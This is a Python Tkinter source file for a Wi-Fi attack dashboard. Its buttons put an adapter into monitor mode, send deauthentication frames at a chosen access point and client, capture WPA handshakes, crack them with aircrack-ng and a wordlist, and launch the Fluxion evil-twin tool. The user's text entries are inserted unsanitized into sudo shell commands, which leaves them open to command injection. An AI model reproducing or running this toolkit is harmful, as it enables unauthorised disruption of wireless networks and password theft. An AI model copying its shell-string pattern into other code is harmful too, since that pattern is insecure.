import tkinter as tk
from tkinter import messagebox
from login import verify_login
from wifi_scanner import scan_wifi as scan_wifi_list
from firewall_ui import enable_firewall, disable_firewall, show_status
import subprocess

# Hardcoded adapter
adapter = "wlp0s20f3"
monitor_adapter = adapter + "mon"
firewall_process = None

def login():
    user = username.get()
    pw = password.get()
    if verify_login(user, pw):
        show_dashboard()
    else:
        messagebox.showerror("Login Failed", "Invalid username or password.")

def show_dashboard():
    for widget in root.winfo_children():
        widget.destroy()

    tk.Label(root, text="Welcome!", font=("Arial", 14)).pack(pady=10)

    # Manual input fields
    global bssid_entry, target_entry, channel_entry, wordlist_entry, cap_entry
    tk.Label(root, text="BSSID").pack()
    bssid_entry = tk.Entry(root, width=40)
    bssid_entry.pack()

    tk.Label(root, text="Target MAC").pack()
    target_entry = tk.Entry(root, width=40)
    target_entry.pack()

    tk.Label(root, text="Channel").pack()
    channel_entry = tk.Entry(root, width=40)
    channel_entry.pack()

    tk.Label(root, text="Wordlist Path").pack()
    wordlist_entry = tk.Entry(root, width=40)
    wordlist_entry.pack()

    tk.Label(root, text="Handshake File (.cap)").pack()
    cap_entry = tk.Entry(root, width=40)
    cap_entry.pack()

    # Buttons
    tk.Button(root, text="Scan WiFi (Nearby)", command=handle_wifi).pack(pady=5)
    tk.Button(root, text="Start Fluxion", command=start_fluxion).pack(pady=5)
    tk.Button(root, text="Monitor Mode ON", command=lambda: start_monitor_mode(adapter)).pack(pady=5)
    tk.Button(root, text="Monitor Mode OFF", command=lambda: stop_monitor_mode(adapter)).pack(pady=5)
    tk.Button(root, text="Scan WiFi (airodump)", command=lambda: scan_wifi()).pack(pady=5)
    tk.Button(root, text="Start Deauth", command=lambda: deauth_attack(
        bssid_entry.get(), target_entry.get(), channel_entry.get())).pack(pady=5)
    tk.Button(root, text="Capture Handshake", command=lambda: capture_handshake(
        bssid_entry.get(), channel_entry.get())).pack(pady=5)
    tk.Button(root, text="Crack Handshake", command=crack_handshake).pack(pady=5)
    tk.Button(root, text="Start Firewall", command=start_firewall).pack(pady=5)
    tk.Button(root, text="Stop Firewall", command=stop_firewall).pack(pady=5)
    tk.Button(root, text="Exit", command=exit_app).pack(pady=5)

    global output_box
    output_box = tk.Text(root, height=15, width=100)
    output_box.pack(pady=10)

def start_monitor_mode(interface):
    subprocess.call(["sudo", "airmon-ng", "check", "kill"])
    subprocess.call(["sudo", "airmon-ng", "start", interface])
    output_box.insert(tk.END, f"✅ Monitor mode ON: {interface}mon\n")

def stop_monitor_mode(interface):
    subprocess.call(["sudo", "airmon-ng", "stop", interface + "mon"])
    subprocess.call(["sudo", "service", "NetworkManager", "start"])
    subprocess.call(["sudo", "service", "wpa_supplicant", "start"])
    output_box.insert(tk.END, f"🛑 Monitor mode OFF: {interface}mon\n")

def start_fluxion():
    try:
        subprocess.Popen([
            "gnome-terminal", "--", "bash", "-c",
            "cd fproj/fluxion && sudo bash fluxion.sh; exec bash"
        ])
        output_box.insert(tk.END, "🚀 Fluxion started in new terminal\n")
    except Exception as e:
        output_box.insert(tk.END, f"❌ Error starting Fluxion: {e}\n")

def start_firewall():
    global firewall_process
    try:
        firewall_process = subprocess.Popen(["sudo", "python3", "firewall.py"])
        output_box.insert(tk.END, "🛡️ Firewall started\n")
    except Exception as e:
        output_box.insert(tk.END, f"❌ Error: {e}\n")

def stop_firewall():
    global firewall_process
    if firewall_process:
        firewall_process.terminate()
        output_box.insert(tk.END, "🛑 Firewall stopped\n")

def handle_wifi():
    result = scan_wifi_list()
    output_box.insert(tk.END, result + "\n")

def scan_wifi():
    subprocess.Popen([
        "xterm", "-hold", "-e",
        f"sudo airodump-ng {monitor_adapter}"
    ])

def deauth_attack(bssid, target_mac, channel):
    subprocess.call(["sudo", "iwconfig", monitor_adapter, "channel", channel])
    subprocess.Popen([
        "xterm", "-hold", "-e",
        f"sudo aireplay-ng --deauth 50 -a {bssid} -c {target_mac} {monitor_adapter}"
    ])

def capture_handshake(bssid, channel):
    subprocess.Popen([
        "xterm", "-hold", "-e",
        f"sudo airodump-ng --bssid {bssid} -c {channel} -w handshake {monitor_adapter}"
    ])

def crack_handshake():
    wordlist = wordlist_entry.get().strip()
    cap_file = cap_entry.get().strip()

    wordlist_path = f"/home/bhaskar/wordlists/{wordlist}"
    cap_file_path = f"/home/bhaskar/cyber_suite/{cap_file}"

    if wordlist and cap_file:
        output_box.insert(tk.END, f"🔓 Cracking with: {wordlist_path} and {cap_file_path}\n")
        try:
            subprocess.Popen([
                "xterm", "-hold", "-e",
                f"sudo aircrack-ng -w {wordlist_path} {cap_file_path}"
            ])
        except Exception as e:
            output_box.insert(tk.END, f"❌ Error running aircrack-ng: {e}\n")
    else:
        output_box.insert(tk.END, "❌ Please enter both wordlist path and .cap file path.\n")

def exit_app():
    stop_monitor_mode(adapter)
    subprocess.call(["sudo", "service", "NetworkManager", "start"])
    output_box.insert(tk.END, "👋 Exiting and restoring network.\n")
    root.destroy()

# ---- Login Window ----
root = tk.Tk()
root.title("II Cyber Suite II")
root.geometry("800x500")

tk.Label(root, text="Username").pack()
username = tk.Entry(root)
username.pack()

tk.Label(root, text="Password").pack()
password = tk.Entry(root, show="*")
password.pack()

tk.Button(root, text="Login", command=login).pack(pady=10)

root.mainloop()
